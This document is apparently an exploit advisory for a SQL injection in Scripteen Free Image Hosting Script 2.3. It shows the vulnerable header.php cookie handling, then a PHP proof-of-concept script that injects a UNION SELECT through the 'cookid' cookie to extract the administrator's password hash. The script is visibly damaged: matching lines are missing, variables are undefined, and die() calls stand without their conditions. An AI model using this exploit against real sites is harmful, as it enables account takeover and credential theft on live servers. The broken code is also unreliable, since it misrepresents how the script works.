Scripteen Free Image Hosting Script 2.3 SQL Injection Exploit
=============================================================


===================
Scripteen Free Image Hosting Script v2.3 SQL Injection vulnerable
===================

The vulnerable: header.php (line 53-62)

	$userid=$_SESSION[&#039;userid&#039;];
	$usergid=$_SESSION[&#039;usergid&#039;];
	if (!$userid || empty($userid) || $userid==""){
    		$userid = $_COOKIE[&#039;cookid&#039;];
	}
	if (!$usergid || empty($usergid) || $usergid==""){
    		$usergid = $_COOKIE[&#039;cookgid&#039;];
	}

As you can see $_COOKIE[&#039;cookid&#039;] and $_COOKIE[&#039;cookgid&#039;] is not filtered and can be used to do an SQL Injection

===================
Proof of concept
===================
<?php
// *************************************
// Global variables
// *************************************
$g_arguments	= getArguments();
$g_url		= isset($g_arguments[&#039;url&#039;]) ? $g_arguments[&#039;url&#039;] : false;
$g_username	= isset($g_arguments[&#039;username&#039;]) ? $g_arguments[&#039;username&#039;] : false;
$g_password	= isset($g_arguments[&#039;password&#039;]) ? $g_arguments[&#039;password&#039;] : false;
// *************************************

// *************************************
// Print help
// *************************************
if(isset($g_arguments[&#039;help&#039;]) || $g_url === false || $g_username === false || $g_password === false)
{
	echo "###################################\n";
	echo "#                                  \n";
	echo "# Scripteen Free Image Hosting V2.3\n";
	echo "#      SQL Injection Exploit       \n";
	echo "#      Discovered by Coksnuss      \n";
	echo "#      POC script by Coksnuss      \n";
	echo "#                                  \n";
	echo "###################################\n";
	
	echo "Usage: " . $argv[0] . "\n";
	echo "\t--help - This help\n";
	echo "\t--url=[STR] - URL of a vulnerable site (e.g. http://www.host.de/path/to/script)\n";
	echo "\t--username=[STR] - A valid username to login\n";
	echo "\t--password=[STR] - A valid password to login\n";
	die();
}
// *************************************


// *************************************
// Main
// *************************************
$url = strpos($g_url, &#039;.php&#039;) !== false ? dirname($g_url) : $g_url;
if(substr($url, -1, 1) == &#039;/&#039; ) $url = substr($url, 0, -1);

// Get Cookie
echo "Generate cookie...";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL,		$g_url . &#039;/login.php&#039;);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_COOKIEJAR,	dirname(__FILE__) . DIRECTORY_SEPARATOR . &#039;cookie.txt&#039;);
curl_setopt($curl, CURLOPT_POST,	true);
curl_setopt($curl, CURLOPT_POSTFIELDS,	&#039;uname=&#039; . urlencode($g_username) . &#039;&pass=&#039; . urlencode($g_password));

$ret = curl_exec($curl);
curl_close($curl);

if(!array_search(&#039;2.3&#039;, $matches[1]))
	echo("\nWarning: It seems like this site do not use version 2.3 of the Scripteen Free Image Hosting Script!\n");

if(!file_exists(dirname(__FILE__) . DIRECTORY_SEPARATOR . &#039;cookie.txt&#039;))
	die(&#039;Be sure that you\&#039;ve enabled CURL and have write permission in the script directory!&#039;);

echo "DONE\n";

// Get userid
echo "Get userid...";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL,		$g_url . &#039;/profile.php&#039;);
curl_setopt($curl, CURLOPT_COOKIEFILE,	dirname(__FILE__) . DIRECTORY_SEPARATOR . &#039;cookie.txt&#039;);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$ret = curl_exec($curl);
curl_close($curl);

	die(&#039;Couldn\&#039;t retrieve userid! Check your login data again!&#039;);

$userid = $match[1];
echo "DONE (" . $userid . ")\n";

// Get the password hash from userid 1
echo "Get the passwordhash from userid 1...\n";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL,		$g_url . &#039;/profile.php&#039;);
curl_setopt($curl, CURLOPT_COOKIE,	&#039;cookid=&#039; . $userid . &#039; UNION SELECT 1,2,password,4,5,6,7,8,9,10,11 FROM users WHERE userid=1; cookgid=3; cookname=&#039; . urlencode($g_username) . &#039;; cookpass=&#039; . md5($g_password));
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$ret = curl_exec($curl);
curl_close($curl);

	die(&#039;Couldn\&#039;t find the password hash!&#039;);

echo "Hash found: " . $match[1] . "\n";
// *************************************


// *************************************
// Global functions
// *************************************
function getArguments()
{
	global $argv;
	
	foreach($argv as $arg)
	{
		if(substr($arg, 0, 2) == &#039;--&#039;)
		{
			// In case its an arguments (e.g. --arg=&#039;1&#039;)
			if(($pos = strpos($arg, &#039;=&#039;)) !== false)
			{
				$name = substr($arg, 2, ($pos - 2));
				$value = substr($arg, ($pos + 1));
				
				$args[$name] = $value;
			// Or just a flag (e.g. --help)
			} else {
				$name = substr($arg, 2);
				
				$args[$name] = true;
			}
		} else if($arg == $argv[0]) {
			$args[0] = $argv[0];
		}
	}
	
	return $args;
}
// *************************************
?>




